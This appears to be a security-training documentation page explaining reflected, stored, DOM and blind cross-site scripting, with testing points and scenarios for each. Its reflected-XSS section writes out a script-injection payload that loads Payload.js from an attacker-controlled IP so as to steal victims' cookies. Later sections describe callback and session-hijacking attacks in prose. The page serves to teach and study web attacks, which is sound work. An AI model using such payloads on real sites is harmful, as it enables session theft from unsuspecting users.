---
sidebar_position: 1
title: Overview
---


`Cross-Site Scripting` also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine. A web application is vulnerable to XSS if it uses unsanitized user Input. 


## Reflected XSS

Reflected XSS happens when User-Supplied Data in an HTTP Request is included in the Webpage Source without any Validation.


- <b style={{ color: 'LightGreen' }}>Testing for Reflected XSS</b>

	- Parameters in the URL Query String
	- URL File Path
	- HTTP Headers 


<br/>

- <b style={{ color: 'Orange' }}>SCENARIO:</b> In this Website if you Enter Incorrect Input, an Error Message is Displayed. The content of the Error Message gets taken from the error parameter in the query string and is built directly into the page source.

```html
┌─────────────────────────────────────────┐
| http://website.com/?error=Invalid Input |
└─────────────────────────────────────────┘

<div class="alert alert-danger">
	<p>Invalid Input</p>
</div>
```

<br/>

- <b style={{ color: 'Plum' }}>EXPLOITING:</b>

	- Attacker sends a Link to Victim that contain Malicious **PAYLOAD**
	- **Victim Clicks the Link** and is Taken to Vulnerable Website
	- Link Containing Attacker's Script is executed on Website
	- The Data the Attacker's Script gathered is sent to them. **[Example: `COOKIES`]**

```html
┌─────────────────────────────────────────┐
| http://website.com/?error=Invalid Input |
└─────────────────────────────────────────┘

<div class="alert alert-danger">
	<p><script src="https://10.25.30.50/Payload.js"></script></p>
</div>
```

<br/>



## Stored XSS

The XSS PAYLOAD is `Stored` on the Web Application **(Database)** and then gets run when other users visit the site or Web Page.

- <b style={{ color: 'LightGreen' }}>Testing For Stored XSS:</b>

	- Comments On a Blog
	- User Profile Information
	- Website Listings

<br/>

- <b style={{ color: 'Orange' }}>SCENARIO:</b> A Blog Website that allows Users to post comments. If these comments aren't checked for whether they contain JavaScript or filter out any Malicious Code. If we post a comment containing JavaScript, this will be stored in the Database, and every other user now visiting the article will have the JavaScript run in their Browser.

<br/>

- <b style={{ color: 'Plum' }}>EXPLOITING:</b>

	- Attacker inserts Malicious **PAYLOAD** into the **Website's Database**
	- For Every visit to the Website the Malicious Script is Activated
	- The Data the Attacker's Script gathered is sent to them. **[Example: `COOKIES`]**


<br/>

## DOM XSS

`DOM` **(Document Object Model)** and is a Programming Interface for HTML and XML Documents. It represents the Page so that programs can change the document structure, style and content. A Web Page is a Document, and this Document can be either displayed in the Browser Window or as the HTML Source.


- <b style={{ color: 'LightGreen' }}>Testing For DOM Based XSS:</b>

	- DOM Based XSS is where the JavaScript Execution happens directly in the Browser without any new pages being loaded or data submitted to Backend Code. **Execution occurs when the website JavaScript Code acts on Input or User Interaction.**

<br/>

- <b style={{ color: 'Orange' }}>SCENARIO:</b> 

    - The website's JavaScript gets the contents from the `window.location.hash` Parameter and then writes that onto the page in the currently being Viewed Section. The contents of the `hash` aren't checked for Malicious Code, allowing an Attacker to Inject JavaScript into the Webpage.

<br/>

- <b style={{ color: 'Plum' }}>EXPLOITING:</b>

	- Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user's session.

<br/>

## Blind XSS

`Blind` XSS is similar to a Stored XSS. But in this instance, you can't see the **PAYLOAD** working or be able to test it against yourself first.

- <b style={{ color: 'LightGreen' }}>Testing For DOM Based XSS:</b>

	- When testing for Blind XSS Vulnerabilities, we need to ensure that the PAYLOAD has a **Call-Back (HTTP Request).** This way, we know when our Code is being Executed.


<br/>

- <b style={{ color: 'Orange' }}>SCENARIO:</b> 

    - A Website has a Contact Form where you can message a member of Staff. The message content doesn't get checked for any Malicious Code, which allows the attacker to enter anything they wish. These Messages then get turned into Support Tickets which staff view on a Private Web Portal.


<br/>

- <b style={{ color: 'Plum' }}>EXPLOITING:</b>

	- The Attacker's JavaScript could make calls back to an Attacker's Website, revealing the staff portal URL, the Staff Member's Cookies, and even the contents of the Portal Page that is being Viewed. Now the Attacker could potentially Hijack the Staff Member's Session and have access to the Private Portal.
